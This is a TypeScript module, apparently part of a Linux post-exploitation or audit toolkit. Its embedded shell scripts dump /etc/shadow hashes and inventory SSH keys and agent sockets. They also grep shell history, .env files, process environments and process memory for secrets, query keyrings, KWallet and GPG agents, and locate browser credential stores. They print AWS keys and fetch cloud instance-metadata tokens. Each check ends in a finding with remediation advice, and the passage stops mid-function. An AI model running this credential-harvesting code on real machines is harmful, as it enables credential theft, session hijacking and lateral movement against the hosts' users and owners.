import { bash, sh, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function shadowDump(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Shadow File Extraction ==="]

  const script = `
echo "--- Shadow File Check ---"
if [ -r /etc/shadow ]; then
  echo "[+] /etc/shadow is readable"
  echo ""
  echo "--- Hash Entries ---"
  while IFS=: read -r user hash rest; do
    if [ -n "$hash" ] && [ "$hash" != "*" ] && [ "$hash" != "!" ] && [ "$hash" != "!!" ] && [ "$hash" != "x" ]; then
      algo="unknown"
      case "$hash" in
        '$6$'*) algo="SHA-512" ;;
        '$5$'*) algo="SHA-256" ;;
        '$y$'*) algo="yescrypt" ;;
        '$2b$'*|'$2a$'*|'$2y$'*) algo="bcrypt" ;;
        '$1$'*) algo="MD5 (weak)" ;;
        '$sha1$'*) algo="SHA-1 (weak)" ;;
      esac
      echo "USER=$user  ALGO=$algo  HASH=${hash:0:20}..."
    fi
  done < /etc/shadow
else
  echo "[-] /etc/shadow is not directly readable"
  echo ""
  echo "--- Checking group readability ---"
  ls -la /etc/shadow 2>/dev/null
  stat /etc/shadow 2>/dev/null | grep -i "access\|uid\|gid"
  echo ""
  echo "--- Checking shadow group membership ---"
  id
  groups
  getent group shadow 2>/dev/null
fi

echo ""
echo "--- Passwd File (for context) ---"
grep -v "nologin\|/false\|/sync\|/halt\|/shutdown" /etc/passwd 2>/dev/null | head -30

echo ""
echo "--- Backup shadow files ---"
ls -la /etc/shadow- /etc/shadow.bak /etc/shadow.old /var/backups/shadow 2>/dev/null
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] /etc/shadow is readable")) {
    const hashCount = (r.stdout.match(/USER=/g) || []).length
    const weakAlgos = (r.stdout.match(/MD5 \(weak\)|SHA-1 \(weak\)/g) || []).length
    findings.push({
      checkId: "LNX-SHADOW-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "/etc/shadow",
      title: "Shadow file hashes extracted",
      details: `Extracted ${hashCount} password hash(es) from /etc/shadow. ${weakAlgos > 0 ? `${weakAlgos} use weak algorithms (MD5/SHA-1).` : "All use strong algorithms."}`,
      remediation: "Restrict /etc/shadow permissions to root:shadow 640. Migrate weak hashes to SHA-512 or yescrypt.",
    })
    if (weakAlgos > 0) {
      findings.push({
        checkId: "LNX-SHADOW-002",
        provider: "linuxhook",
        severity: "HIGH",
        status: "FOUND",
        resource: "/etc/shadow",
        title: "Weak password hash algorithms detected",
        details: `${weakAlgos} account(s) use MD5 or SHA-1 hashing — trivially crackable with modern GPUs`,
        remediation: "Reconfigure PAM to use SHA-512 or yescrypt (pam_unix.so sha512/yescrypt). Force password resets for affected accounts.",
      })
    }
  }

  if (r.stdout.includes("shadow.bak") || r.stdout.includes("shadow-") || r.stdout.includes("shadow.old") || r.stdout.includes("/var/backups/shadow")) {
    findings.push({
      checkId: "LNX-SHADOW-003",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "FOUND",
      resource: "/etc/shadow-",
      title: "Shadow backup files found",
      details: "Backup copies of /etc/shadow exist — may have weaker permissions than the original",
      remediation: "Remove or restrict permissions on shadow backup files (shadow-, shadow.bak, /var/backups/shadow).",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function sshKeyHarvest(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== SSH Key Harvest ==="]

  const script = `
echo "--- SSH Private Keys ---"
for dir in /root /home/*; do
  if [ -d "$dir/.ssh" ]; then
    echo "[*] Found .ssh in $dir"
    for keyfile in "$dir/.ssh/id_rsa" "$dir/.ssh/id_ecdsa" "$dir/.ssh/id_ed25519" "$dir/.ssh/id_dsa"; do
      if [ -f "$keyfile" ]; then
        perms=$(stat -c '%a' "$keyfile" 2>/dev/null || stat -f '%Lp' "$keyfile" 2>/dev/null)
        encrypted=""
        grep -q "ENCRYPTED" "$keyfile" && encrypted="(encrypted)" || encrypted="(UNENCRYPTED)"
        echo "  [+] PRIVATE KEY: $keyfile  perms=$perms $encrypted"
      fi
    done
    for pemfile in "$dir/.ssh/"*.pem "$dir/"*.pem; do
      if [ -f "$pemfile" ]; then
        perms=$(stat -c '%a' "$pemfile" 2>/dev/null || stat -f '%Lp' "$pemfile" 2>/dev/null)
        echo "  [+] PEM FILE: $pemfile  perms=$perms"
      fi
    done
    if [ -f "$dir/.ssh/authorized_keys" ]; then
      count=$(wc -l < "$dir/.ssh/authorized_keys" 2>/dev/null)
      echo "  [*] authorized_keys: $count key(s) in $dir/.ssh/authorized_keys"
    fi
    if [ -f "$dir/.ssh/known_hosts" ]; then
      count=$(wc -l < "$dir/.ssh/known_hosts" 2>/dev/null)
      echo "  [*] known_hosts: $count host(s) in $dir/.ssh/known_hosts"
    fi
    if [ -f "$dir/.ssh/config" ]; then
      echo "  [*] SSH config found: $dir/.ssh/config"
      grep -iE "^(Host |HostName |User |IdentityFile |ProxyJump |ProxyCommand )" "$dir/.ssh/config" 2>/dev/null
    fi
  fi
done

echo ""
echo "--- SSH Agent ---"
if [ -n "$SSH_AUTH_SOCK" ]; then
  echo "[+] SSH_AUTH_SOCK=$SSH_AUTH_SOCK"
  ssh-add -l 2>/dev/null && echo "[+] Agent has loaded keys" || echo "[-] Agent has no keys or not accessible"
else
  echo "[-] No SSH_AUTH_SOCK set"
  find /tmp -name "agent.*" -type s 2>/dev/null | head -5
fi

echo ""
echo "--- System SSH Keys ---"
ls -la /etc/ssh/ssh_host_*_key 2>/dev/null
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const privateKeys = (r.stdout.match(/PRIVATE KEY:/g) || []).length
  const unencrypted = (r.stdout.match(/UNENCRYPTED/g) || []).length
  if (privateKeys > 0) {
    findings.push({
      checkId: "LNX-SSH-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "ssh_keys",
      title: "SSH private keys found",
      details: `${privateKeys} SSH private key(s) found. ${unencrypted > 0 ? `${unencrypted} are UNENCRYPTED — can be used directly for lateral movement.` : "All are encrypted."}`,
      remediation: "Protect SSH private keys with strong passphrases. Rotate keys regularly. Remove unnecessary keys.",
    })
  }

  if (r.stdout.includes("SSH_AUTH_SOCK=")) {
    findings.push({
      checkId: "LNX-SSH-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "ssh_agent",
      title: "SSH agent socket accessible",
      details: "SSH agent socket is available — can be hijacked for lateral movement without needing the private key",
      remediation: "Use SSH agent forwarding sparingly. Set AddKeysToAgent to confirm or ask.",
    })
  }

  const pemFiles = (r.stdout.match(/PEM FILE:/g) || []).length
  if (pemFiles > 0) {
    findings.push({
      checkId: "LNX-SSH-003",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "pem_files",
      title: "PEM certificate/key files found",
      details: `${pemFiles} PEM file(s) found — may contain private keys for cloud instances or TLS`,
      remediation: "Store PEM files in a secrets manager. Restrict file permissions to 400.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function bashHistorySecrets(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Shell History Secrets Scan ==="]

  const script = `
PATTERNS='(mysql.*-p|psql.*-W|sshpass|curl.*-u |wget.*--password|htpasswd|openssl passwd|ansible-vault.*--vault-password|aws_secret|AKIA[0-9A-Z]{16}|Authorization:|Bearer |token=|password=|passwd=|SECRET_KEY|API_KEY|PRIVATE_KEY|ssh .*@)'

for dir in /root /home/*; do
  for histfile in "$dir/.bash_history" "$dir/.zsh_history" "$dir/.sh_history" "$dir/.history" "$dir/.python_history"; do
    if [ -r "$histfile" ]; then
      matches=$(grep -inE "$PATTERNS" "$histfile" 2>/dev/null | head -50)
      if [ -n "$matches" ]; then
        user=$(basename "$dir")
        echo "[+] Secrets found in $histfile (user: $user):"
        echo "$matches" | while read -r line; do
          echo "  $line"
        done
        echo ""
      fi
    fi
  done
done

echo "--- MySQL History ---"
for dir in /root /home/*; do
  if [ -r "$dir/.mysql_history" ]; then
    echo "[+] MySQL history: $dir/.mysql_history"
    grep -iE "(password|grant|identified|set password)" "$dir/.mysql_history" 2>/dev/null | head -10
  fi
done

echo ""
echo "--- PSQL History ---"
for dir in /root /home/*; do
  if [ -r "$dir/.psql_history" ]; then
    echo "[+] PSQL history: $dir/.psql_history"
    grep -iE "(password|role|alter|create user)" "$dir/.psql_history" 2>/dev/null | head -10
  fi
done

echo ""
echo "--- Less/Vim History (may contain searched passwords) ---"
for dir in /root /home/*; do
  for f in "$dir/.lesshst" "$dir/.viminfo"; do
    if [ -r "$f" ]; then
      secrets=$(grep -iE "(password|secret|token|key|api)" "$f" 2>/dev/null | head -5)
      if [ -n "$secrets" ]; then
        echo "[+] Found in $f:"
        echo "$secrets"
      fi
    fi
  done
done
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const secretMatches = (r.stdout.match(/\[+\] Secrets found in/g) || []).length
  if (secretMatches > 0) {
    findings.push({
      checkId: "LNX-HISTORY-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "shell_history",
      title: "Credentials found in shell history",
      details: `${secretMatches} history file(s) contain passwords, API keys, or tokens in command arguments`,
      remediation: "Clear shell history (history -c, rm ~/.bash_history). Set HISTCONTROL=ignorespace to avoid saving sensitive commands.",
    })
  }

  if (r.stdout.includes("AKIA")) {
    findings.push({
      checkId: "LNX-HISTORY-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "shell_history",
      title: "AWS access key found in shell history",
      details: "AWS Access Key ID (AKIA...) found in command history — can be used for cloud access",
      remediation: "Rotate the exposed AWS key immediately. Use IAM roles or credential files instead of CLI arguments.",
    })
  }

  if (r.stdout.includes("MySQL history") || r.stdout.includes("PSQL history")) {
    findings.push({
      checkId: "LNX-HISTORY-003",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "FOUND",
      resource: "db_history",
      title: "Database CLI history with credentials",
      details: "MySQL or PostgreSQL command history files found — may contain SQL statements with passwords",
      remediation: "Remove database CLI history files. Use ~/.my.cnf or .pgpass for authentication instead.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function gnomeKeyringDump(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== GNOME Keyring Dump ==="]

  const script = `
echo "--- GNOME Keyring Daemon ---"
pgrep -a gnome-keyring 2>/dev/null || echo "[-] gnome-keyring-daemon not running"

echo ""
echo "--- secret-tool availability ---"
if command -v secret-tool >/dev/null 2>&1; then
  echo "[+] secret-tool is available"
  echo ""
  echo "--- Stored Secrets (labels) ---"
  secret-tool search --all 2>/dev/null | grep -E "^(label|secret)" | head -40
else
  echo "[-] secret-tool not installed"
fi

echo ""
echo "--- Keyring Files ---"
for dir in /root /home/*; do
  keydir="$dir/.local/share/keyrings"
  if [ -d "$keydir" ]; then
    echo "[+] Keyring dir: $keydir"
    ls -la "$keydir/" 2>/dev/null
    for f in "$keydir"/*.keyring "$keydir"/default; do
      if [ -f "$f" ]; then
        echo "  File: $f ($(wc -c < "$f") bytes)"
      fi
    done
  fi
done

echo ""
echo "--- DBUS Session ---"
echo "DBUS_SESSION_BUS_ADDRESS=$DBUS_SESSION_BUS_ADDRESS"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("secret-tool is available") || r.stdout.includes("label =")) {
    findings.push({
      checkId: "LNX-KEYRING-001",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "FOUND",
      resource: "gnome_keyring",
      title: "GNOME Keyring secrets accessible",
      details: "GNOME Keyring is available and can be queried via secret-tool — stored passwords, WiFi credentials, and application secrets may be extractable",
      remediation: "Lock the keyring when not in use. Use a strong keyring password separate from the login password.",
    })
  }

  if (r.stdout.includes(".keyring") || r.stdout.includes("Keyring dir:")) {
    findings.push({
      checkId: "LNX-KEYRING-002",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "FOUND",
      resource: "keyring_files",
      title: "GNOME Keyring database files found",
      details: "Keyring database files found on disk — can be copied for offline cracking or extraction",
      remediation: "Encrypt home directories. Restrict keyring file permissions.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function kwalletDump(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== KDE Wallet (KWallet) Dump ==="]

  const script = `
echo "--- KWallet Daemon ---"
pgrep -a kwalletd 2>/dev/null || echo "[-] kwalletd not running"

echo ""
echo "--- kwallet-query availability ---"
if command -v kwallet-query >/dev/null 2>&1; then
  echo "[+] kwallet-query is available"
  kwallet-query -l 2>/dev/null | head -20
else
  echo "[-] kwallet-query not installed"
fi

echo ""
echo "--- KWallet Files ---"
for dir in /root /home/*; do
  for kdir in "$dir/.local/share/kwalletd" "$dir/.kde/share/apps/kwallet" "$dir/.local/share/kwalletd5"; do
    if [ -d "$kdir" ]; then
      echo "[+] KWallet dir: $kdir"
      ls -la "$kdir/" 2>/dev/null
    fi
  done
done
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("kwallet-query is available") || r.stdout.includes("KWallet dir:")) {
    findings.push({
      checkId: "LNX-KWALLET-001",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "FOUND",
      resource: "kwallet",
      title: "KDE Wallet data accessible",
      details: "KDE Wallet (KWallet) is present — may store network passwords, application credentials, and certificates",
      remediation: "Lock KWallet when not in use. Use a strong wallet password.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function browserCredsLinux(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Browser Credentials (Linux) ==="]

  const script = `
echo "--- Google Chrome / Chromium ---"
for dir in /root /home/*; do
  for browser in ".config/google-chrome" ".config/chromium"; do
    bdir="$dir/$browser"
    if [ -d "$bdir" ]; then
      echo "[+] Found: $bdir"
      for profile in "$bdir/Default" "$bdir/Profile "* ; do
        if [ -d "$profile" ]; then
          pname=$(basename "$profile")
          [ -f "$profile/Login Data" ] && echo "  [+] Login Data ($pname): $profile/Login Data ($(wc -c < "$profile/Login Data") bytes)"
          [ -f "$profile/Cookies" ] && echo "  [+] Cookies ($pname): $profile/Cookies ($(wc -c < "$profile/Cookies") bytes)"
          [ -f "$profile/Web Data" ] && echo "  [*] Web Data ($pname): $profile/Web Data (autofill, credit cards)"
          [ -f "$profile/Local State" ] && echo "  [*] Local State: $bdir/Local State (encryption key)"
        fi
      done
    fi
  done
done

echo ""
echo "--- Mozilla Firefox ---"
for dir in /root /home/*; do
  ffdir="$dir/.mozilla/firefox"
  if [ -d "$ffdir" ]; then
    echo "[+] Found: $ffdir"
    cat "$ffdir/profiles.ini" 2>/dev/null | grep -E "^(Name|Path|Default)" || true
    for profile in "$ffdir/"*.default* "$ffdir/"*.default-release*; do
      if [ -d "$profile" ]; then
        pname=$(basename "$profile")
        [ -f "$profile/logins.json" ] && echo "  [+] logins.json ($pname): contains encrypted passwords"
        [ -f "$profile/key4.db" ] && echo "  [+] key4.db ($pname): master key database"
        [ -f "$profile/key3.db" ] && echo "  [+] key3.db ($pname): legacy key database"
        [ -f "$profile/cookies.sqlite" ] && echo "  [+] cookies.sqlite ($pname)"
        [ -f "$profile/cert9.db" ] && echo "  [*] cert9.db ($pname): certificate store"
      fi
    done
  fi
done

echo ""
echo "--- Other Browsers ---"
for dir in /root /home/*; do
  [ -d "$dir/.config/brave-browser" ] && echo "[+] Brave: $dir/.config/brave-browser"
  [ -d "$dir/.config/vivaldi" ] && echo "[+] Vivaldi: $dir/.config/vivaldi"
  [ -d "$dir/.config/opera" ] && echo "[+] Opera: $dir/.config/opera"
  [ -d "$dir/.config/microsoft-edge" ] && echo "[+] Edge: $dir/.config/microsoft-edge"
done
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("Login Data") || r.stdout.includes("logins.json")) {
    const loginDbs = (r.stdout.match(/Login Data|logins\.json/g) || []).length
    findings.push({
      checkId: "LNX-BROWSER-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "browser_creds",
      title: "Browser credential databases found",
      details: `${loginDbs} browser login database(s) found — saved passwords can be extracted with tools like LaZagne, browser_cookie3, or custom scripts`,
      remediation: "Use a dedicated password manager instead of browser-saved passwords. Enable OS-level keyring integration.",
    })
  }

  if (r.stdout.includes("Cookies") || r.stdout.includes("cookies.sqlite")) {
    findings.push({
      checkId: "LNX-BROWSER-002",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "FOUND",
      resource: "browser_cookies",
      title: "Browser cookie databases found",
      details: "Session cookies can be extracted for session hijacking — access to authenticated web applications without credentials",
      remediation: "Use browser profiles with short session expiry. Enable SameSite cookie attributes.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function envSecrets(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Environment Variable Secrets ==="]

  const script = `
echo "--- Current Environment ---"
env 2>/dev/null | grep -iE "(password|passwd|secret|token|api_key|apikey|private|auth|credential|access_key|aws_)" | sort

echo ""
echo "--- /proc/*/environ (readable processes) ---"
for pid in $(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | head -100); do
  if [ -r "/proc/$pid/environ" ]; then
    procname=$(cat /proc/$pid/comm 2>/dev/null)
    secrets=$(tr '\\0' '\\n' < /proc/$pid/environ 2>/dev/null | grep -iE "(password|passwd|secret|token|api_key|apikey|private|auth|credential|access_key|aws_)" 2>/dev/null)
    if [ -n "$secrets" ]; then
      echo "[+] PID $pid ($procname):"
      echo "$secrets" | head -10
      echo ""
    fi
  fi
done

echo ""
echo "--- Systemd Service Environments ---"
if command -v systemctl >/dev/null 2>&1; then
  for svc in $(systemctl list-units --type=service --state=running --no-legend 2>/dev/null | awk '{print $1}' | head -30); do
    envvars=$(systemctl show "$svc" -p Environment 2>/dev/null | grep -iE "(password|secret|token|key)")
    envfile=$(systemctl show "$svc" -p EnvironmentFiles 2>/dev/null | grep -v "^EnvironmentFiles=$")
    if [ -n "$envvars" ] || [ -n "$envfile" ]; then
      echo "[+] Service: $svc"
      [ -n "$envvars" ] && echo "  $envvars"
      [ -n "$envfile" ] && echo "  EnvFile: $envfile"
    fi
  done
fi

echo ""
echo "--- .env Files (common locations) ---"
find /opt /srv /var/www /home -maxdepth 4 -name ".env" -readable 2>/dev/null | while read -r envfile; do
  secrets=$(grep -iE "(password|secret|token|key|api)" "$envfile" 2>/dev/null | head -5)
  if [ -n "$secrets" ]; then
    echo "[+] $envfile:"
    echo "$secrets"
    echo ""
  fi
done
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const envMatches = (r.stdout.match(/\[+\]/g) || []).length
  if (envMatches > 0) {
    findings.push({
      checkId: "LNX-ENV-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "environment",
      title: "Secrets found in environment variables",
      details: `${envMatches} source(s) contain secrets in environment variables — passwords, API keys, tokens exposed in process memory`,
      remediation: "Use a secrets manager (Vault, AWS Secrets Manager) instead of environment variables. Restrict /proc access with hidepid=2.",
    })
  }

  if (r.stdout.includes(".env:")) {
    findings.push({
      checkId: "LNX-ENV-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "dotenv_files",
      title: "Dotenv files with credentials found",
      details: "Application .env files contain plaintext credentials — common in web applications",
      remediation: "Use proper secrets management. Restrict .env file permissions to application user only (600).",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function procMemoryHarvest(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Process Memory Credential Harvest ==="]

  const target = argVal(args, "--target")
  const targets = target ? [target] : ["sshd", "nginx", "apache2", "httpd", "mysqld", "postgres", "redis-server", "vsftpd", "proftpd"]

  const script = `
echo "--- Checking ptrace_scope ---"
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || echo "unknown"

echo ""
echo "--- Target Process Memory Scan ---"
TARGETS="${targets.join(" ")}"
for procname in $TARGETS; do
  pids=$(pgrep -x "$procname" 2>/dev/null || pgrep -f "$procname" 2>/dev/null)
  for pid in $pids; do
    if [ -r "/proc/$pid/mem" ] && [ -r "/proc/$pid/maps" ]; then
      echo "[+] PID $pid ($procname) — memory readable"
      grep -E "\\[heap\\]|\\[stack\\]" /proc/$pid/maps 2>/dev/null | head -5
      strings /proc/$pid/mem 2>/dev/null | grep -iE "(password|passwd|pass=|pwd=|secret|token|auth)" 2>/dev/null | sort -u | head -20
      echo ""
    else
      echo "[-] PID $pid ($procname) — memory not readable (ptrace_scope or permissions)"
    fi
  done
done

echo ""
echo "--- Core Dumps ---"
find /var/crash /var/core /tmp -name "core.*" -o -name "*.core" 2>/dev/null | head -10
ls -la /var/crash/ 2>/dev/null
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const readable = (r.stdout.match(/memory readable/g) || []).length
  if (readable > 0) {
    findings.push({
      checkId: "LNX-PROC-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "process_memory",
      title: "Process memory contains credentials",
      details: `${readable} process(es) have readable memory — credential strings extracted from heap/stack`,
      remediation: "Set kernel.yama.ptrace_scope=1 or higher. Restrict /proc access with hidepid=2.",
    })
  }

  const ptraceScope = r.stdout.match(/^(\d)$/m)
  if (ptraceScope && ptraceScope[1] === "0") {
    findings.push({
      checkId: "LNX-PROC-002",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "FOUND",
      resource: "/proc/sys/kernel/yama/ptrace_scope",
      title: "YAMA ptrace_scope is disabled (0)",
      details: "Any process can ptrace any other process owned by the same user — enables credential extraction from process memory",
      remediation: "Set kernel.yama.ptrace_scope=1 in /etc/sysctl.conf",
    })
  }

  if (r.stdout.includes("core.") || r.stdout.includes(".core")) {
    findings.push({
      checkId: "LNX-PROC-003",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "FOUND",
      resource: "core_dumps",
      title: "Core dump files found",
      details: "Core dumps may contain process memory with credentials, encryption keys, or sensitive data",
      remediation: "Disable core dumps (ulimit -c 0, /etc/security/limits.conf). Remove existing core files.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function gpgKeyExtract(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== GPG Key Extraction ==="]

  const script = `
echo "--- GPG Keyrings ---"
for dir in /root /home/*; do
  gpgdir="$dir/.gnupg"
  if [ -d "$gpgdir" ]; then
    echo "[+] GPG directory: $gpgdir"
    ls -la "$gpgdir/" 2>/dev/null
    echo ""
    echo "  Private keys:"
    gpg --homedir "$gpgdir" --list-secret-keys --keyid-format long 2>/dev/null | head -30
    echo ""
    echo "  Public keys:"
    gpg --homedir "$gpgdir" --list-keys --keyid-format long 2>/dev/null | head -20
    echo ""
  fi
done

echo "--- GPG Agent ---"
pgrep -a gpg-agent 2>/dev/null || echo "[-] gpg-agent not running"
echo "GPG_AGENT_INFO=$GPG_AGENT_INFO"

echo ""
echo "--- Cached Passphrases ---"
gpg-connect-agent 'keyinfo --list' /bye 2>/dev/null | head -10 || echo "[-] Cannot query gpg-agent"

echo ""
echo "--- Exported Key Check ---"
find /root /home -maxdepth 3 -name "*.asc" -o -name "*.gpg" -o -name "*.pgp" 2>/dev/null | head -10
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("sec ") || r.stdout.includes("ssb ")) {
    const keyCount = (r.stdout.match(/sec /g) || []).length
    findings.push({
      checkId: "LNX-GPG-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "gpg_keys",
      title: "GPG private keys found",
      details: `${keyCount} GPG private key(s) found — can be used for decryption, signing, or identity impersonation`,
      remediation: "Protect GPG keys with strong passphrases. Use hardware tokens (YubiKey) for key storage.",
    })
  }

  if (r.stdout.includes("keyinfo") && !r.stdout.includes("Cannot query")) {
    findings.push({
      checkId: "LNX-GPG-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "gpg_agent",
      title: "GPG agent has cached passphrases",
      details: "GPG agent is running with cached key passphrases — keys can be used without re-entering passphrase",
      remediation: "Set short cache TTL in gpg-agent.conf (default-cache-ttl, max-cache-ttl).",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function cloudCredHarvest(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Cloud Credential Harvest ==="]

  const script = `
echo "--- AWS Credentials ---"
for dir in /root /home/*; do
  if [ -f "$dir/.aws/credentials" ]; then
    echo "[+] AWS credentials: $dir/.aws/credentials"
    grep -E "^\\[|aws_access_key_id|aws_secret_access_key|aws_session_token" "$dir/.aws/credentials" 2>/dev/null
    echo ""
  fi
  if [ -f "$dir/.aws/config" ]; then
    echo "[*] AWS config: $dir/.aws/config"
    grep -E "^\\[|role_arn|source_profile|region" "$dir/.aws/config" 2>/dev/null
    echo ""
  fi
done
env | grep -i "^AWS_" 2>/dev/null

echo ""
echo "--- GCP Credentials ---"
for dir in /root /home/*; do
  gcpdir="$dir/.config/gcloud"
  if [ -d "$gcpdir" ]; then
    echo "[+] GCP config: $gcpdir"
    [ -f "$gcpdir/credentials.db" ] && echo "  [+] credentials.db found ($(wc -c < "$gcpdir/credentials.db") bytes)"
    [ -f "$gcpdir/application_default_credentials.json" ] && echo "  [+] application_default_credentials.json found"
    [ -f "$gcpdir/properties" ] && grep -E "account|project" "$gcpdir/properties" 2>/dev/null
    echo ""
  fi
done
[ -n "$GOOGLE_APPLICATION_CREDENTIALS" ] && echo "[+] GOOGLE_APPLICATION_CREDENTIALS=$GOOGLE_APPLICATION_CREDENTIALS"

echo ""
echo "--- Azure Credentials ---"
for dir in /root /home/*; do
  azdir="$dir/.azure"
  if [ -d "$azdir" ]; then
    echo "[+] Azure config: $azdir"
    [ -f "$azdir/accessTokens.json" ] && echo "  [+] accessTokens.json found ($(wc -c < "$azdir/accessTokens.json") bytes)"
    [ -f "$azdir/azureProfile.json" ] && echo "  [*] azureProfile.json found"
    [ -f "$azdir/msal_token_cache.json" ] && echo "  [+] msal_token_cache.json found"
    echo ""
  fi
done
env | grep -i "^AZURE_" 2>/dev/null

echo ""
echo "--- Other Cloud Tokens ---"
for dir in /root /home/*; do
  [ -f "$dir/.config/doctl/config.yaml" ] && echo "[+] DigitalOcean: $dir/.config/doctl/config.yaml"
  [ -f "$dir/.config/heroku/config" ] && echo "[+] Heroku CLI: $dir/.config/heroku/config"
  [ -f "$dir/.config/hcloud/cli.toml" ] && echo "[+] Hetzner: $dir/.config/hcloud/cli.toml"
  [ -f "$dir/.terraform.d/credentials.tfrc.json" ] && echo "[+] Terraform Cloud: $dir/.terraform.d/credentials.tfrc.json"
  [ -f "$dir/.config/linode-cli" ] && echo "[+] Linode: $dir/.config/linode-cli"
done

echo ""
echo "--- Instance Metadata ---"
curl -s -m 2 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token 2>/dev/null && echo "" && echo "[+] GCP metadata token accessible"
curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null | head -5 && echo "[+] AWS metadata accessible"
curl -s -m 2 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null | head -3 && echo "[+] Azure IMDS accessible"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("aws_access_key_id") || r.stdout.includes("aws_secret_access_key")) {
    findings.push({
      checkId: "LNX-CLOUD-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "aws_credentials",
      title: "AWS credentials found on disk",
      details: "AWS access keys found in ~/.aws/credentials — can be used for cloud resource access and privilege escalation",
      remediation: "Use IAM roles instead of long-term access keys. Rotate keys regularly. Use aws-vault for local key management.",
    })
  }

  if (r.stdout.includes("credentials.db") || r.stdout.includes("application_default_credentials")) {
    findings.push({
      checkId: "LNX-CLOUD-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "gcp_credentials",
      title: "GCP credentials found on disk",
      details: "GCP credential files found — can be used for cloud resource access via gcloud CLI or API",
      remediation: "Use workload identity or service account impersonation. Restrict credential file permissions.",
    })
  }

  if (r.stdout.includes("accessTokens.json") || r.stdout.includes("msal_token_cache")) {
    findings.push({
      checkId: "LNX-CLOUD-003",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "azure_credentials",
      title: "Azure credentials found on disk",
      details: "Azure access tokens or MSAL cache found — can be used for Azure resource access",
      remediation: "Use managed identities. Clear token caches after use (az account clear).",
    })
  }

  if (r.stdout.includes("metadata token accessible") || r.stdout.includes("metadata accessible") || r.stdout.includes("IMDS accessible")) {
    findings.push({
      checkId: "LNX-CLOUD-004",
      provider: "linuxhook",
      severity: "HIGH",
      status: "FOUND",
      resource: "instance_metadata",
      title: "Cloud instance metadata service accessible",
      details: "IMDS is accessible — can retrieve IAM credentials, instance identity, and user data without authentication",
      remediation: "Use IMDSv2 (AWS) with hop limit. Restrict metadata access via firewall rules. Use network policies.",
    })
